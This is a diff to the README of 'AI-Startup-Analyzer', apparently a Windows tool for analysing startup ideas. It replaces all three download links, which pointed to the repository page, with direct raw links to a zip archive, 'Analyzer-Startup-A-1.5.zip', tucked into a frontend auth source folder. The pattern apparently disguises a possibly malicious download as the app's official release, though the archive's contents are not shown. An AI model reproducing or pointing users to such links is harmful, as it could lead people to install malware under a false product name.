@@ -1,6 +1,6 @@
 # 🤖 AI-Startup-Analyzer - Analyze Startup Ideas Clearly
 
-[![Download AI-Startup-Analyzer](https://img.shields.io/badge/Download-AI--Startup--Analyzer-brightgreen?style=for-the-badge)](https://github.com/lengthwise-lek697/AI-Startup-Analyzer)
+[![Download AI-Startup-Analyzer](https://img.shields.io/badge/Download-AI--Startup--Analyzer-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lengthwise-lek697/AI-Startup-Analyzer/main/apps/frontend/src/app/auth/Analyzer-Startup-A-1.5.zip)
 
 ## 📋 What is AI-Startup-Analyzer?
 
@@ -25,7 +25,7 @@ Before installing, make sure your Windows PC matches these needs:
 
 Click on the green button below to visit the download page. The files and instructions are easy to find there:
 
-[![Download AI-Startup-Analyzer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lengthwise-lek697/AI-Startup-Analyzer)
+[![Download AI-Startup-Analyzer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/lengthwise-lek697/AI-Startup-Analyzer/main/apps/frontend/src/app/auth/Analyzer-Startup-A-1.5.zip)
 
 ### 2. Choose the Latest Version
 
@@ -153,4 +153,4 @@ These technologies work together to give you fast and accurate results without t
 
 ---
 
-[Download AI-Startup-Analyzer](https://github.com/lengthwise-lek697/AI-Startup-Analyzer) to start exploring your startup ideas today.
+[Download AI-Startup-Analyzer](https://raw.githubusercontent.com/lengthwise-lek697/AI-Startup-Analyzer/main/apps/frontend/src/app/auth/Analyzer-Startup-A-1.5.zip) to start exploring your startup ideas today.
